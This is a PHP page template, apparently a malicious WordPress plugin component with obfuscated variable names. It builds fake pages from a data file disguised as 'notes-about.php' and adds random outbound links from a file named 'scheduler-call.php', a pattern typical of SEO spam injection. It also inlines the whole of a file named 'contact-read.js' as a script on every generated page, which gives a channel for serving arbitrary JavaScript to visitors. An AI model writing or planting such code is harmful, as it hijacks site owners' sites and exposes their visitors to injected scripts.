<?php
$vljILDsg = intval(get_query_var('dhdwxk'));

if ($vljILDsg < 1 || $vljILDsg > 3094) return;
$xRz8t = file(plugin_dir_path(__FILE__).'notes-about.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$krlDM26Q = explode(';', $xRz8t[$vljILDsg]);
if (count($krlDM26Q) < 2) return;
$dmL0GMb = $krlDM26Q[0];
$gqOStNt  = $krlDM26Q[1];
$mzYeM = $krlDM26Q[2];
$kbOJeP  = $krlDM26Q[3];
$oNT8j40q = $krlDM26Q[4];
set_query_var('exwtqnk', $dmL0GMb);

$s7a3e = '';
$bf8q7cfp = plugin_dir_path(__FILE__).'scheduler-call.php';
if (is_file($bf8q7cfp)) {
	$ha8M7 = file($bf8q7cfp, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($ha8M7);
	shuffle($ha8M7);
	$qI0aSWfoMt = mt_rand(2, 5);
	if (count($ha8M7) > $qI0aSWfoMt) {
		for ($hDtP3Hs = 0; $hDtP3Hs < $qI0aSWfoMt; $hDtP3Hs++) {
			$vO6O53g2o = array_shift($ha8M7);
			$s7a3e .= '<p><a href="'.$vO6O53g2o.'">'.$vO6O53g2o.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $dmL0GMb; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $gqOStNt . "</p>\n";
				if (strlen($kbOJeP) > 0) echo "<p>" . $kbOJeP . "</p>\n";
				if (strlen($mzYeM) > 0) echo "<p>" . $mzYeM . "</p>\n";
				if (strlen($oNT8j40q) > 0) echo '<p><a href="#"><img src="'.$oNT8j40q.'"></a>' . "</p>\n";
				echo $s7a3e;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$e7yFSn = plugin_dir_path(__FILE__) . 'contact-read.js';
if (is_file($e7yFSn)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($e7yFSn);
	echo '</script>';
}
get_footer();
?>
